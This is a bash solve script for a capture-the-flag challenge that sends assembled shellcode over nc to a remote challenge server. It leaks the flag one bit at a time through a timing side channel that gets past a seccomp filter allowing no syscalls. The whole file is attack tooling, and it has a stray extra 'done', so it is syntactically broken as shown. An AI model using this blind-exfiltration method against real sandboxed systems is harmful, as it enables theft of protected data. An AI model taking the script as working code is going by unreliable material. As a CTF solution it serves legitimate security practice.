#!/bin/bash

rm no_syscall_flag

for ((i=1; i < 60; i++))
do
    binval=""
    for ((j=7; j >= 0; j--))
    do
        echo "Cracking bit $j of index $i"
        (sed -e "s/\[index\]/$i/; s/\[shift\]/$j/" seccomp_break.S) > seccomp_break_temp.S;
        gcc -static -nostdlib seccomp_break_temp.S -o seccomp_break-elf; 
        objcopy --dump-section .text=seccomp_break seccomp_break-elf;

        cat seccomp_break | timeout 4s nc no-syscalls-allowed.chal.uiuc.tf 1337
        val=$?

        if [[ $val -eq 0 ]]; then
            binval="${binval}0"
        else
            binval="${binval}1"
        fi

        
    done
    asciiChar=$((2#$binval))

    echo "Extracted character:  $asciiChar"
    if [ $asciiChar -eq  125 ]; then
        echo -n "END OF FLAG! SAYANORA!"
        exit 0
    fi
    (echo $asciiChar | awk '{printf("%c",$1)}') >> ./no_syscall_flag
    done
done